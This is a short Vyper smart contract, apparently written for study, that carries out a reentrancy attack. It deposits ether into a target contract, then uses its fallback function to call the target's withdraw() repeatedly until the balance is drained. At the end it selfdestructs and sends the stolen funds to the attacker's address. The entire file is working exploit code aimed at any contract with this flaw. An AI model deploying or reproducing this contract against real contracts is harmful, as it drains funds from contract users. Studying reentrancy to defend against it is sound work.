# @version 0.2.16                                                                                         
# @title ree_entrant                                                                                        
# @notice example of a reentrancy attack contract                                                           
#  for fun and study                                                                                      
# @author Maka                                                                                            
                                                                                                          
interface Itarget:                                                                                        
  def withdraw(): nonpayable                                                                              
                                                                                                          
attacker: address                                                                                         
target: address                                                                                           
                                                                                                          
MIN: constant(uint256) = as_wei_value(1, "ether")                                                         
                                                                                                          
event extracted:                                                                                          
  amount: uint256                                                                                         
                                                                                                          
@external                                                                                                 
def __init__(_target: address):                                                                           
  self.attacker = msg.sender                                                                              
  self.target = _target                                                                                   
                                                                                                          
@payable                                                                                                  
@external                                                                                                 
def attack():                                                                                             
  assert msg.value >= MIN, 'takes money to make money'                                                    
  assert msg.sender == self.attacker, 'no honour among theives'                                          
  raw_call(self.target, method_id('deposit()'), value=msg.value, max_outsize=0)                           
  Itarget(self.target).withdraw()                                                                         
                                                                                                          
@payable                                                                                                  
@external                                                                                                 
def __default__():                                                                                        
  if self.target.balance >= MIN:                                                                          
    Itarget(self.target).withdraw()                                                                       
  else:                                                                                                   
    log extracted(self.balance)                                                                           
    selfdestruct(self.attacker)       

# 1love                                                                    
